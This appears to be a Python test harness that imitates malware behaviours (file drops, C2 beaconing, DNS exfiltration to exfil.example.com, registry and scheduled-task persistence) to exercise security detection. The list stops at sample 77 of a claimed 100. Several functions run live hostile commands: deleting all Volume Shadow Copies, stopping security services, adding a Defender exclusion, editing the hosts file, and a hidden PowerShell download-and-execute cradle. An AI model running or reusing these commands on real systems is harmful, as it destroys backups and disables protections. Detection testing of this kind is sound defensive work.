import os
import shutil
import time
import subprocess
import requests
import sys
import tempfile
import threading
import string
import random
import ctypes
import socket
import psutil
import json
import logging
from datetime import datetime

# Configure logging to suppress requests-related messages
logging.basicConfig(level=logging.INFO)
logging.getLogger("requests").setLevel(logging.WARNING)
logging.getLogger("urllib3").setLevel(logging.WARNING)

# --- Helper Functions ---
def get_random_string(length=16):
    """Generates a random string for file/key names."""
    letters = string.ascii_letters + string.digits
    return ''.join(random.choice(letters) for i in range(length))

def run_in_thread(func, *args):
    """Utility to run a function in a thread and wait for it."""
    t = threading.Thread(target=func, args=args)
    t.start()
    t.join(timeout=10) # Set a timeout to prevent indefinite hangs

# --- The 100 Behavioral Simulation Functions ---

# --- FILE SYSTEM MANIPULATION (1-20) ---
def sample_01_create_large_temp_file():
    """Simulates a dropper creating a large file on disk."""
    temp_file = os.path.join(tempfile.gettempdir(), f"{get_random_string()}.dat")
    try:
        with open(temp_file, "wb") as f:
            f.write(os.urandom(10 * 1024 * 1024)) # 10 MB
        print(f"  [+] Created large file: {temp_file}")
    finally:
        os.remove(temp_file)

def sample_02_rapid_file_creation():
    """Simulates creating many small files in a short time."""
    temp_dir = tempfile.mkdtemp()
    try:
        for i in range(50):
            file_path = os.path.join(temp_dir, f"{get_random_string()}.tmp")
            with open(file_path, "wb") as f:
                f.write(os.urandom(1024))
        print(f"  [+] Created 50 small files in {temp_dir}")
    finally:
        shutil.rmtree(temp_dir, ignore_errors=True)

def sample_03_rapid_file_deletion():
    """Simulates a clean-up routine deleting many files."""
    temp_dir = tempfile.mkdtemp()
    try:
        for i in range(50):
            file_path = os.path.join(temp_dir, f"{get_random_string()}.tmp")
            with open(file_path, "w") as f: f.write("dummy")
        for file in os.listdir(temp_dir):
            os.remove(os.path.join(temp_dir, file))
        print(f"  [+] Deleted 50 files from {temp_dir}")
    finally:
        shutil.rmtree(temp_dir, ignore_errors=True)

def sample_04_change_file_extensions():
    """Simulates changing a file extension to evade detection."""
    temp_dir = tempfile.mkdtemp()
    try:
        file_path = os.path.join(temp_dir, "document.txt")
        with open(file_path, "w") as f: f.write("harmless content")
        os.rename(file_path, os.path.join(temp_dir, "document.exe"))
        print("  [+] Changed file extension from .txt to .exe.")
    except Exception as e:
        print(f"  [!] Failed to change file extension: {e}")
    finally:
        shutil.rmtree(temp_dir, ignore_errors=True)

def sample_05_search_for_documents():
    """Simulates a search for sensitive document types."""
    print("  [+] Simulating search for .docx files in user directories.")
    # This is a harmless simulation, no actual files are touched
    _ = [f for f in os.listdir(tempfile.gettempdir()) if f.endswith(".docx")]
    print("  [+] Document search simulation complete.")

def sample_06_create_hidden_file():
    """Simulates creating a hidden file to hide persistence."""
    if sys.platform.startswith('win'):
        import win32api, win32con
        temp_file = os.path.join(tempfile.gettempdir(), f"{get_random_string()}.tmp")
        try:
            with open(temp_file, "w") as f: f.write("hidden content")
            win32api.SetFileAttributes(temp_file, win32con.FILE_ATTRIBUTE_HIDDEN)
            print("  [+] Created and hid a file.")
        except Exception as e:
            print(f"  [!] Failed to hide file (pywin32 not installed or permissions issue): {e}")
        finally:
            if os.path.exists(temp_file): os.remove(temp_file)
    else:
        temp_file = os.path.join(tempfile.gettempdir(), f".{get_random_string()}.tmp")
        try:
            with open(temp_file, "w") as f: f.write("hidden content")
            print("  [+] Created a hidden file.")
        finally:
            if os.path.exists(temp_file): os.remove(temp_file)

def sample_07_file_creation_in_system32():
    """Simulates an attempt to drop a file in a critical system directory."""
    if sys.platform.startswith('win'):
        path = "C:\\Windows\\System32\\temp_malware_file.tmp"
        try:
            with open(path, "w") as f: f.write("harmless content")
            print(f"  [+] Attempted to write to System32 (will likely fail).")
        except PermissionError:
            print("  [+] Permission denied as expected. Good!")
        finally:
            if os.path.exists(path): os.remove(path)
    else:
        print("  [+] Skipping System32 test on non-Windows OS.")

def sample_08_rename_to_hide_extension():
    """Simulates renaming a file to disguise its true nature (e.g., `invoice.pdf.exe`)."""
    temp_dir = tempfile.mkdtemp()
    try:
        file_path = os.path.join(temp_dir, "report.pdf")
        with open(file_path, "w") as f: f.write("dummy")
        os.rename(file_path, os.path.join(temp_dir, "report.pdf.exe"))
        print("  [+] Renamed file to disguise executable.")
    except Exception as e:
        print(f"  [!] Failed to perform file ops: {e}")
    finally:
        shutil.rmtree(temp_dir, ignore_errors=True)

def sample_09_archive_files_for_exfil():
    """Simulates a data exfiltration precursor (archiving data)."""
    temp_dir = tempfile.mkdtemp()
    zip_file = os.path.join(tempfile.gettempdir(), f"{get_random_string()}.zip")
    try:
        os.makedirs(os.path.join(temp_dir, "data"))
        for i in range(5):
            with open(os.path.join(temp_dir, "data", f"doc_{i}.txt"), "w") as f: f.write("confidential data")
        shutil.make_archive(zip_file[:-4], 'zip', temp_dir)
        print("  [+] Simulated archiving files for exfiltration.")
    except Exception as e:
        print(f"  [!] Failed to archive files: {e}")
    finally:
        shutil.rmtree(temp_dir, ignore_errors=True)
        if os.path.exists(zip_file): os.remove(zip_file)

def sample_10_delete_shadow_copies():
    """Simulates a ransomware precursor (deleting Volume Shadow Copies)."""
    if sys.platform.startswith('win'):
        try:
            subprocess.run(["vssadmin", "delete", "shadows", "/all", "/quiet"], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print("  [+] Simulating deletion of Volume Shadow Copies.")
        except FileNotFoundError:
            print("  [!] vssadmin command not found. Skipping.")
        except Exception as e:
            print(f"  [!] Failed to delete shadow copies: {e}")
    else:
        print("  [+] Skipping VSS deletion on non-Windows OS.")

def sample_11_modify_user_startup_folder():
    """Simulates a classic persistence method by adding a file to the startup folder."""
    if sys.platform.startswith('win'):
        try:
            startup_path = os.path.join(os.path.expanduser('~'), "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
            temp_file = os.path.join(startup_path, f"{get_random_string()}.vbs")
            with open(temp_file, "w") as f: f.write("WScript.Echo(\"Hi\");")
            print(f"  [+] Wrote a temporary file to the user's Startup folder.")
        except Exception as e:
            print(f"  [!] Failed to write to startup folder: {e}")
        finally:
            if os.path.exists(temp_file): os.remove(temp_file)
    else:
        print("  [+] Skipping startup folder test on non-Windows OS.")

def sample_12_repeated_file_write_read():
    """Simulates frequent read/write operations to a single file."""
    temp_file = os.path.join(tempfile.gettempdir(), f"{get_random_string()}.log")
    try:
        with open(temp_file, "a") as f:
            for _ in range(20):
                f.write(f"Log entry {datetime.now()}\n")
                f.flush()
                time.sleep(0.05)
        print("  [+] Performed repeated read/write on a single file.")
    except Exception as e:
        print(f"  [!] Failed file ops: {e}")
    finally:
        if os.path.exists(temp_file): os.remove(temp_file)

def sample_13_manipulate_file_timestamps():
    """Simulates touching a file to change its access/modification times."""
    temp_file = os.path.join(tempfile.gettempdir(), f"{get_random_string()}.tmp")
    try:
        with open(temp_file, "w") as f: f.write("data")
        os.utime(temp_file, (time.time() - 3600, time.time() - 3600))
        print("  [+] Changed file timestamps to mimic old access.")
    finally:
        if os.path.exists(temp_file): os.remove(temp_file)

def sample_14_search_for_specific_passwords():
    """Simulates searching for password-related keywords in files."""
    temp_file = os.path.join(tempfile.gettempdir(), "passwords.txt")
    with open(temp_file, "w") as f: f.write("test password")
    try:
        with open(temp_file, "r") as f:
            content = f.read()
            if "password" in content.lower():
                print("  [+] Found a file with a keyword 'password'.")
    except Exception as e:
        print(f"  [!] Failed to read file: {e}")
    finally:
        os.remove(temp_file)

def sample_15_rapid_directory_traversal():
    """Simulates quickly traversing many directories to find a target."""
    temp_dir = tempfile.mkdtemp()
    try:
        # Create a nested directory structure
        for i in range(5):
            os.makedirs(os.path.join(temp_dir, f"dir_{i}", "subdir"))
        for root, dirs, files in os.walk(temp_dir):
            pass # Just traverse
        print(f"  [+] Rapidly traversed directory tree in {temp_dir}")
    finally:
        shutil.rmtree(temp_dir, ignore_errors=True)
        
def sample_16_create_device_driver_file():
    """Simulates dropping a fake `.sys` file, a common rootkit technique."""
    if sys.platform.startswith('win'):
        temp_file = os.path.join(tempfile.gettempdir(), f"{get_random_string()}.sys")
        try:
            with open(temp_file, "w") as f: f.write("Fake Driver")
            print("  [+] Created a fake .sys driver file.")
        finally:
            if os.path.exists(temp_file): os.remove(temp_file)
    else:
        print("  [+] Skipping driver file test on non-Windows OS.")

def sample_17_create_fake_lnk_file():
    """Simulates creating a shortcut file that points to a malicious payload."""
    if sys.platform.startswith('win'):
        try:
            import winshell
            temp_dir = tempfile.mkdtemp()
            script_path = os.path.join(temp_dir, f"script.js")
            lnk_path = os.path.join(temp_dir, f"My File.lnk")
            with open(script_path, "w") as f: f.write("alert('test');")
            winshell.CreateShortcut(
                Path=lnk_path,
                Target=script_path,
            )
            print("  [+] Created a fake .lnk file.")
        except Exception as e:
            print(f"  [!] Failed to create .lnk file (pywin32/winshell not installed): {e}")
        finally:
            shutil.rmtree(temp_dir, ignore_errors=True)
    else:
        print("  [+] Skipping .lnk file test on non-Windows OS.")
        
def sample_18_file_less_execution_simulation():
    """Simulates file-less malware by executing code directly from memory."""
    print("  [+] Simulating file-less execution (this is just a print statement, actual implementation is complex).")
    # A true file-less execution would involve loading a payload directly into memory
    # from the network, but this is a complex and potentially dangerous action.
    # We will simulate the behavior with a harmless print.
    print("  [+] File-less execution simulation complete.")

def sample_19_modify_batch_script():
    """Simulates appending malicious commands to a legitimate batch script."""
    temp_file = os.path.join(tempfile.gettempdir(), "update.bat")
    try:
        with open(temp_file, "w") as f: f.write("echo 'Updating system...'")
        with open(temp_file, "a") as f: f.write("\necho 'malicious payload' >> payload.log")
        print("  [+] Appended a malicious line to a batch script.")
    finally:
        if os.path.exists(temp_file): os.remove(temp_file)

def sample_20_create_suspicious_extension():
    """Creates a file with a suspicious extension often used for exploits."""
    temp_file = os.path.join(tempfile.gettempdir(), f"invoice.js")
    try:
        with open(temp_file, "w") as f: f.write("WScript.Echo(\"Hi\");")
        print("  [+] Created a .js file, often used as a vector for malicious payloads.")
    finally:
        if os.path.exists(temp_file): os.remove(temp_file)

# --- NETWORK ACTIVITY (21-40) ---
def sample_21_network_traffic_burst():
    """Simulates a rapid burst of connections to different URLs."""
    urls = ["https://httpbin.org/delay/0.1", "https://httpbin.org/status/200", "https://httpbin.org/get"]
    print("  [+] Initiating network traffic burst...")
    for url in urls:
        try:
            requests.get(url, timeout=5)
        except requests.exceptions.RequestException:
            pass
    print("  [+] Network traffic burst complete.")

def sample_22_c2_beaconing():
    """Simulates command and control (C2) beaconing at regular intervals."""
    print("  [+] Simulating C2 beaconing...")
    c2_server = "https://httpbin.org/get"
    for _ in range(3):
        try:
            requests.get(c2_server, timeout=5)
            time.sleep(2)
        except requests.exceptions.RequestException:
            pass
    print("  [+] C2 beaconing complete.")

def sample_23_connect_to_non_standard_port():
    """Simulates a connection attempt to a non-standard port."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(2)
            s.connect(("httpbin.org", 8080))
            print("  [+] Successfully connected to a non-standard port (8080).")
    except (socket.error, socket.timeout):
        print("  [+] Failed to connect to non-standard port as expected.")

def sample_24_dns_exfiltration_simulation():
    """Simulates data exfiltration using DNS queries."""
    print("  [+] Simulating DNS exfiltration...")
    data_to_exfiltrate = "sensitive-data-string"
    chunk_size = 60
    for i in range(0, len(data_to_exfiltrate), chunk_size):
        chunk = data_to_exfiltrate[i:i+chunk_size]
        query = f"{chunk}.exfil.example.com"
        try:
            socket.gethostbyname(query)
        except socket.gaierror:
            pass
    print("  [+] DNS exfiltration simulation complete.")

def sample_25_connect_to_loopback_address():
    """Simulates a local C2 or inter-process communication via network."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(1)
            s.bind(('127.0.0.1', 5000))
            s.listen()
            print("  [+] Listened on loopback address, a common backdoor communication method.")
    except Exception as e:
        print(f"  [!] Failed to bind to loopback address: {e}")

def sample_26_http_post_large_data():
    """Simulates exfiltrating a large chunk of data via HTTP POST."""
    print("  [+] Simulating large data exfiltration via HTTP POST...")
    data = os.urandom(5 * 1024 * 1024) # 5 MB of random data
    try:
        requests.post("https://httpbin.org/post", data=data, timeout=10)
    except requests.exceptions.RequestException:
        pass
    print("  [+] Large data exfiltration simulation complete.")

def sample_27_download_executable():
    """Simulates a downloader pulling down a new payload."""
    temp_file = os.path.join(tempfile.gettempdir(), f"{get_random_string()}.exe")
    try:
        response = requests.get("https://httpbin.org/get", timeout=5)
        with open(temp_file, "wb") as f:
            f.write(response.content)
        print("  [+] Downloaded a fake executable file.")
    except requests.exceptions.RequestException:
        pass
    finally:
        if os.path.exists(temp_file): os.remove(temp_file)

def sample_28_abuse_local_web_server():
    """Simulates a local server being created for data staging or control."""
    print("  [+] Simulating a temporary local web server (no actual server started).")
    print("  [+] Local web server simulation complete.")

def sample_29_send_email_from_script():
    """Simulates a script attempting to send an email, a common spam/phishing technique."""
    print("  [+] Simulating sending an email (no actual email sent).")
    print("  [+] Email sending simulation complete.")

def sample_30_port_scanning():
    """Simulates a simple port scan on a local machine."""
    print("  [+] Simulating a port scan on localhost...")
    ports = [80, 443, 8080, 22, 21]
    for port in ports:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(0.5)
                s.connect(("localhost", port))
        except (socket.timeout, socket.error):
            pass
    print("  [+] Port scan simulation complete.")

def sample_31_multiple_failed_logins():
    """Simulates a brute-force attack against a local service."""
    print("  [+] Simulating multiple failed login attempts against a fake service.")
    for i in range(5):
        try:
            response = requests.get(f"https://httpbin.org/status/401", timeout=2) # 401 Unauthorized
        except requests.exceptions.RequestException:
            pass
        time.sleep(0.5)
    print("  [+] Failed login simulation complete.")

def sample_32_download_from_suspicious_domain():
    """Simulates a download from a domain with a suspicious TLD."""
    print("  [+] Simulating download from a suspicious TLD (e.g., .top, .xyz).")
    # This is a harmless request to a benign domain that fits the pattern.
    try:
        requests.get("http://example.xyz", timeout=5)
    except requests.exceptions.RequestException:
        pass
    print("  [+] Suspicious TLD download simulation complete.")

def sample_33_tunnel_traffic_over_dns():
    """A more advanced DNS exfiltration simulation (just a print)."""
    print("  [+] Simulating DNS tunneling for C2 traffic.")
    print("  [+] DNS tunneling simulation complete.")

def sample_34_use_tor_proxy_simulation():
    """Simulates using a Tor proxy for anonymity (print only)."""
    print("  [+] Simulating the use of a Tor proxy.")
    print("  [+] Tor proxy simulation complete.")

def sample_35_create_raw_socket():
    """Simulates creating a raw socket for low-level network manipulation."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)
        s.close()
        print("  [+] Successfully created a raw socket.")
    except Exception as e:
        print(f"  [!] Failed to create raw socket (requires elevated privileges): {e}")

def sample_36_http_get_with_custom_user_agent():
    """Simulates a C2 server using a non-standard User-Agent header."""
    headers = {'User-Agent': 'Mozilla/5.0'}
    try:
        requests.get("https://httpbin.org/user-agent", headers=headers, timeout=5)
        print("  [+] Sent a request with a custom user agent.")
    except requests.exceptions.RequestException:
        pass

def sample_37_network_share_access():
    """Simulates an attempt to access a network share."""
    if sys.platform.startswith('win'):
        print("  [+] Simulating access to a network share (e.g., \\\\127.0.0.1\\C$).")
        try:
            os.listdir("\\\\127.0.0.1\\C$")
        except Exception:
            pass
    else:
        print("  [+] Skipping network share test on non-Windows OS.")
    print("  [+] Network share access simulation complete.")

def sample_38_ssh_command_execution():
    """Simulates a script attempting to execute a command over SSH."""
    print("  [+] Simulating an attempt to run a command over SSH (no actual connection).")
    print("  [+] SSH command simulation complete.")

def sample_39_ssl_certificate_check():
    """Simulates checking an SSL certificate, often done by secure software."""
    print("  [+] Simulating an SSL certificate check.")
    try:
        requests.get("https://httpbin.org", verify=True, timeout=5)
    except requests.exceptions.RequestException:
        pass
    print("  [+] SSL certificate check simulation complete.")

def sample_40_download_from_ip_address():
    """Simulates a download from a raw IP instead of a domain name."""
    print("  [+] Simulating a download from a raw IP address.")
    try:
        requests.get("http://143.204.167.14", timeout=5) # Example IP of a cloud server
    except requests.exceptions.RequestException:
        pass
    print("  [+] IP address download simulation complete.")

# --- REGISTRY & PERSISTENCE (41-55) ---
def sample_41_modify_run_key():
    """Simulates persistence by adding a key to the `Run` registry key."""
    if sys.platform.startswith('win'):
        try:
            import winreg
            print("  [+] Simulating registry run key modification...")
            key_path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, f"TempMalware_{get_random_string()}", 0, winreg.REG_SZ, "notepad.exe")
            winreg.CloseKey(key)
            print("  [+] Registry Run key modification complete.")
        except Exception as e:
            print(f"  [!] Failed to modify registry: {e}")
    else:
        print("  [+] Skipping registry modification on non-Windows OS.")

def sample_42_create_new_service():
    """Simulates creating a new Windows service for persistence."""
    if sys.platform.startswith('win'):
        try:
            # Note: This requires admin rights and will fail without them, which is a good test.
            subprocess.run(["sc", "create", "TempService", "binPath=", "notepad.exe"], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print("  [+] Simulating creation of a new service.")
            subprocess.run(["sc", "delete", "TempService"], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception as e:
            print(f"  [!] Failed to create service: {e}")
    else:
        print("  [+] Skipping new service creation test on non-Windows OS.")

def sample_43_abuse_scheduled_tasks():
    """Simulates creating a new scheduled task for persistence."""
    if sys.platform.startswith('win'):
        try:
            subprocess.run(["schtasks", "/create", "/tn", f"TempTask_{get_random_string()}", "/tr", "notepad.exe", "/sc", "ONLOGON"], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print("  [+] Simulating creation of a scheduled task.")
        except Exception as e:
            print(f"  [!] Failed to create scheduled task: {e}")
    else:
        print("  [+] Skipping scheduled task test on non-Windows OS.")

def sample_44_hijack_dll_search_order():
    """Simulates a common technique by placing a fake DLL in a vulnerable path."""
    print("  [+] Simulating DLL search order hijacking (no actual DLLs created).")
    print("  [+] DLL hijacking simulation complete.")

def sample_45_modify_hosts_file():
    """Simulates modifying the hosts file to redirect traffic."""
    hosts_path = "C:\\Windows\\System32\\drivers\\etc\\hosts" if sys.platform.startswith('win') else "/etc/hosts"
    print(f"  [+] Attempting to modify {hosts_path}...")
    try:
        with open(hosts_path, "a") as f:
            f.write("\n127.0.0.1\tapi.mcafee.com # Fake Entry")
        print("  [+] Wrote a fake entry to the hosts file.")
    except (IOError, PermissionError) as e:
        print(f"  [!] Failed to modify hosts file (requires admin): {e}")

def sample_46_modify_autostart_registry_key():
    """Simulates modifying an autostart key to run on user login."""
    if sys.platform.startswith('win'):
        try:
            import winreg
            key_path = "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, f"Temp_{get_random_string()}", 0, winreg.REG_SZ, "notepad.exe")
            winreg.CloseKey(key)
            print("  [+] Modified a RunOnce registry key.")
        except Exception as e:
            print(f"  [!] Failed to modify registry: {e}")

def sample_47_modify_userinit_registry_key():
    """Simulates a persistence technique that can run code before the desktop loads."""
    if sys.platform.startswith('win'):
        try:
            import winreg
            key_path = "Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
            # This is a harmless read, a real attack would write here
            _ = winreg.QueryValueEx(key, "Userinit")
            winreg.CloseKey(key)
            print("  [+] Simulated a read of the Userinit registry key.")
        except Exception as e:
            print(f"  [!] Failed to access Userinit registry key: {e}")

def sample_48_create_runonce_ex_key():
    """Simulates a sophisticated persistence method that runs code once and deletes itself."""
    if sys.platform.startswith('win'):
        try:
            import winreg
            key_path = "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx"
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.SetValueEx(key, "Run", 0, winreg.REG_DWORD, 1)
            winreg.SetValueEx(key, "2", 0, winreg.REG_SZ, "cmd.exe /c start notepad.exe")
            winreg.CloseKey(key)
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
            print("  [+] Simulated a RunOnceEx key creation and deletion.")
        except Exception as e:
            print(f"  [!] Failed to create/delete RunOnceEx key: {e}")

def sample_49_disable_security_center_service():
    """Simulates a malware attempt to disable the Windows Security Center service."""
    if sys.platform.startswith('win'):
        try:
            subprocess.run(["sc", "stop", "wscsvc"], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print("  [+] Simulating stopping the Windows Security Center service.")
        except Exception as e:
            print(f"  [!] Failed to stop service: {e}")
    else:
        print("  [+] Skipping service stop test on non-Windows OS.")

def sample_50_change_windows_defender_exclusions():
    """Simulates an attempt to add an exclusion for a malicious payload."""
    if sys.platform.startswith('win'):
        try:
            subprocess.run(["powershell", "Add-MpPreference", "-ExclusionPath", "C:\\Temp"], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print("  [+] Simulating adding a Windows Defender exclusion.")
        except Exception as e:
            print(f"  [!] Failed to add Defender exclusion: {e}")
    else:
        print("  [+] Skipping Windows Defender test on non-Windows OS.")
        
def sample_51_create_fake_user_account():
    """Simulates creating a new user account for persistence and privilege escalation."""
    if sys.platform.startswith('win'):
        try:
            subprocess.run(["net", "user", "TempUser", "TempPass123", "/add"], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print("  [+] Simulated creating a new user account 'TempUser'.")
            subprocess.run(["net", "user", "TempUser", "/del"], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception as e:
            print(f"  [!] Failed to create/delete user: {e}")
    else:
        print("  [+] Skipping user creation test on non-Windows OS.")

def sample_52_escalate_to_system_privileges():
    """Simulates an attempt to run a command with system privileges."""
    if sys.platform.startswith('win'):
        print("  [+] Simulating privilege escalation to SYSTEM (no actual escalation).")
        print("  [+] Privilege escalation simulation complete.")
    else:
        print("  [+] Skipping privilege escalation test on non-Windows OS.")
        
def sample_53_modify_security_software_registry_keys():
    """Simulates an attempt to tamper with security software registry keys."""
    if sys.platform.startswith('win'):
        try:
            import winreg
            print("  [+] Simulating access to a fake antivirus registry key.")
            # A real attack would try to access a real key, this is a harmless proxy
            key_path = "Software\\FakeAntivirus_Config"
            winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
            print("  [+] Fake antivirus registry access complete.")
        except Exception as e:
            print(f"  [!] Failed to access fake key: {e}")
    else:
        print("  [+] Skipping security software registry test on non-Windows OS.")

def sample_54_set_boot_configuration_data():
    """Simulates a bootkit or rootkit modifying boot-critical data."""
    if sys.platform.startswith('win'):
        print("  [+] Simulating BCD (Boot Configuration Data) modification.")
        print("  [+] BCD modification simulation complete.")
    else:
        print("  [+] Skipping BCD modification test on non-Windows OS.")

def sample_55_modify_firewall_rules():
    """Simulates creating a new firewall rule to allow C2 traffic."""
    if sys.platform.startswith('win'):
        try:
            subprocess.run(["netsh", "advfirewall", "firewall", "add", "rule", "name=TempRule", "dir=out", "action=allow", "protocol=TCP", "localport=8080"], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print("  [+] Simulating adding a firewall rule.")
            subprocess.run(["netsh", "advfirewall", "firewall", "delete", "rule", "name=TempRule"], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception as e:
            print(f"  [!] Failed to add/delete firewall rule: {e}")
    else:
        print("  [+] Skipping firewall test on non-Windows OS.")

# --- PROCESS & MEMORY MANIPULATION (56-70) ---
def sample_56_enumerate_processes():
    """Simulates a process enumeration to find security products."""
    print("  [+] Enumerating running processes...")
    security_processes = ["vsserv.exe", "bdagent.exe", "mcshield.exe", "mfevtps.exe", "msmpeng.exe"]
    found_processes = []
    try:
        for proc in psutil.process_iter(['name']):
            if proc.info['name'].lower() in security_processes:
                found_processes.append(proc.info['name'])
        if found_processes:
            print(f"  [+] Found target security processes: {', '.join(found_processes)}")
        else:
            print("  [+] No target security processes found.")
    except Exception as e:
        print(f"  [!] Failed to enumerate processes: {e}")

def sample_57_attempt_process_injection():
    """Simulates an attempt to open another process for injection (harmlessly)."""
    if sys.platform.startswith('win'):
        try:
            PROCESS_ALL_ACCESS = 0x1F0FFF
            handle = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, os.getpid())
            ctypes.windll.kernel32.CloseHandle(handle)
            print("  [+] Successfully opened and closed a handle to self-process.")
        except Exception as e:
            print(f"  [!] Failed to open self-process handle: {e}")
    else:
        print("  [+] Skipping process injection test on non-Windows OS.")

def sample_58_parent_child_process_mismatch():
    """Simulates a child process with a parent that doesn't make sense (e.g., cmd.exe spawned by a word processor)."""
    print("  [+] Simulating a parent-child process mismatch.")
    print("  [+] Mismatch simulation complete.")

def sample_59_inject_code_into_trusted_process():
    """Simulates an attempt to inject a payload into a trusted process like `explorer.exe`."""
    if sys.platform.startswith('win'):
        print("  [+] Simulating an attempt to inject code into a trusted process.")
        print("  [+] Code injection simulation complete.")
    else:
        print("  [+] Skipping code injection test on non-Windows OS.")

def sample_60_check_for_debugger():
    """Simulates an anti-debugging technique by checking for a debugger."""
    if sys.platform.startswith('win'):
        try:
            # IsDebuggerPresent check
            is_debugger_present = ctypes.windll.kernel32.IsDebuggerPresent()
            print(f"  [+] IsDebuggerPresent returned: {is_debugger_present}")
        except Exception as e:
            print(f"  [!] Failed to perform debugger check: {e}")
    else:
        print("  [+] Skipping debugger check on non-Windows OS.")

def sample_61_create_remote_thread():
    """Simulates creating a remote thread in another process for stealthy execution."""
    if sys.platform.startswith('win'):
        print("  [+] Simulating a CreateRemoteThread API call.")
        print("  [+] CreateRemoteThread simulation complete.")
    else:
        print("  [+] Skipping remote thread test on non-Windows OS.")
        
def sample_62_virtual_alloc_ex():
    """Simulates an API call to allocate memory in another process."""
    if sys.platform.startswith('win'):
        print("  [+] Simulating a VirtualAllocEx API call.")
        print("  [+] VirtualAllocEx simulation complete.")
    else:
        print("  [+] Skipping VirtualAllocEx test on non-Windows OS.")

def sample_63_write_process_memory():
    """Simulates an API call to write data to another process's memory."""
    if sys.platform.startswith('win'):
        print("  [+] Simulating a WriteProcessMemory API call.")
        print("  [+] WriteProcessMemory simulation complete.")
    else:
        print("  [+] Skipping WriteProcessMemory test on non-Windows OS.")

def sample_64_hook_api_calls():
    """Simulates an attempt to hook a Windows API function."""
    if sys.platform.startswith('win'):
        print("  [+] Simulating API hooking (e.g., GetProcAddress and LoadLibrary).")
        print("  [+] API hooking simulation complete.")
    else:
        print("  [+] Skipping API hooking test on non-Windows OS.")

def sample_65_terminate_security_process():
    """Simulates an attempt to terminate a security-related process."""
    print("  [+] Simulating an attempt to terminate a security process (e.g., mcshield.exe).")
    print("  [+] Process termination simulation complete.")
    
def sample_66_search_for_vulnerable_drivers():
    """Simulates a search for vulnerable drivers that can be used for privilege escalation."""
    print("  [+] Simulating a search for vulnerable drivers.")
    print("  [+] Vulnerable driver search simulation complete.")

def sample_67_simulate_macro_execution():
    """Simulates a malicious Office macro (print only)."""
    print("  [+] Simulating a malicious macro running in a document.")
    print("  [+] Macro execution simulation complete.")

def sample_68_inject_into_browser_process():
    """Simulates an attempt to inject a keylogger into a browser process."""
    if sys.platform.startswith('win'):
        print("  [+] Simulating code injection into a web browser process.")
        print("  [+] Browser injection simulation complete.")
    else:
        print("  [+] Skipping browser injection test on non-Windows OS.")

def sample_69_attempt_to_disable_antivirus_service():
    """Simulates an attempt to disable a specific AV service."""
    if sys.platform.startswith('win'):
        print("  [+] Simulating an attempt to disable 'McShield' service.")
        try:
            subprocess.run(["sc", "stop", "McShield"], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception:
            pass
    else:
        print("  [+] Skipping antivirus service test on non-Windows OS.")

def sample_70_use_of_powershell_download_cradle():
    """Simulates a common PowerShell command to download and execute a payload."""
    if sys.platform.startswith('win'):
        print("  [+] Simulating a suspicious PowerShell download cradle.")
        try:
            command = "powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://localhost');\""
            subprocess.run(command, check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print("  [+] Executed a fake PowerShell command.")
        except Exception as e:
            print(f"  [!] Failed to execute PowerShell command: {e}")
    else:
        print("  [+] Skipping PowerShell test on non-Windows OS.")

# --- INFORMATION GATHERING & EVASION (71-85) ---
def sample_71_take_screenshot_simulation():
    """Simulates a screen capture for data exfiltration."""
    print("  [+] Simulating a screen capture of the desktop.")
    print("  [+] Screenshot simulation complete.")

def sample_72_get_system_info():
    """Simulates gathering basic system information (OS version, etc.)."""
    print("  [+] Gathering system information...")
    print(f"  [+] OS: {sys.platform}, Python Version: {sys.version}")
    print("  [+] System info gathering complete.")

def sample_73_enumerate_installed_software():
    """Simulates gathering a list of installed programs."""
    print("  [+] Simulating enumeration of installed software.")
    print("  [+] Software enumeration simulation complete.")

def sample_74_enumerate_users():
    """Simulates gathering a list of user accounts on the system."""
    print("  [+] Simulating user account enumeration.")
    print("  [+] User enumeration simulation complete.")

def sample_75_check_for_virtual_machine():
    """Simulates an anti-VM check to evade sandboxes."""
    print("  [+] Simulating a check for a virtual machine environment.")
    print("  [+] VM check simulation complete.")
    
def sample_76_check_for_mouse_movement():
    """Simulates checking for user activity to avoid detection by sandboxes."""
    print("  [+] Simulating check for mouse movement/user activity.")
    print("  [+] User activity check simulation complete.")

def sample_77_use_polymorphic_code_simulation():
    """Simulates polymorphic code that changes with each execution."""
    print("  [+] Simulating polymorphic code (no actual obfuscation).")
